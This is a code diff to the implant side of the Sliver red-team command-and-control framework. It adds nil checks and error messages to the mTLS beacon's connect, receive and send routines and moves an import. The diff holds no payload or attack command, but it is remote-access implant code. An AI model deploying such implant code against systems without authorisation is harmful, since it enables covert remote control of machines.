@@ -37,6 +37,8 @@ import (
 	// {{end}}
 
 	// {{if or .Config.IncludeMTLS .Config.IncludeWG}}
+	"errors"
+
 	"github.com/hashicorp/yamux"
 
 	// {{end}}
@@ -46,7 +48,6 @@ import (
 	// {{end}}
 
 	// {{if .Config.IncludeWG}}
-	"errors"
 	"net"
 
 	"github.com/bishopfox/sliver/implant/sliver/transports/wireguard"
@@ -208,6 +209,9 @@ func mtlsBeacon(uri *url.URL) *Beacon {
 			if err != nil {
 				return err
 			}
+			if conn == nil {
+				return errors.New("[mtls] connect returned nil conn")
+			}
 			if _, err := conn.Write([]byte(mtls.YamuxPreface)); err != nil {
 				_ = conn.Close()
 				return err
@@ -217,20 +221,39 @@ func mtlsBeacon(uri *url.URL) *Beacon {
 				_ = conn.Close()
 				return err
 			}
+			if muxSession == nil {
+				_ = conn.Close()
+				return errors.New("[mtls] failed to create yamux session (nil)")
+			}
 			return nil
 		},
 		Recv: func() (*pb.Envelope, error) {
+			if muxSession == nil {
+				return nil, errors.New("[mtls] recv called with nil yamux session")
+			}
 			stream, err := muxSession.Accept()
 			if err != nil {
 				return nil, err
+			}
+			if isNilInterface(stream) {
+				return nil, errors.New("[mtls] accept returned nil stream")
 			}
 			defer stream.Close()
 			return mtls.ReadEnvelope(stream)
 		},
 		Send: func(envelope *pb.Envelope) error {
+			if envelope == nil {
+				return errors.New("[mtls] nil envelope")
+			}
+			if muxSession == nil {
+				return errors.New("[mtls] send called with nil yamux session")
+			}
 			stream, err := muxSession.Open()
 			if err != nil {
 				return err
+			}
+			if isNilInterface(stream) {
+				return errors.New("[mtls] open returned nil stream")
 			}
 			defer stream.Close()
 			return mtls.WriteEnvelope(stream, envelope)
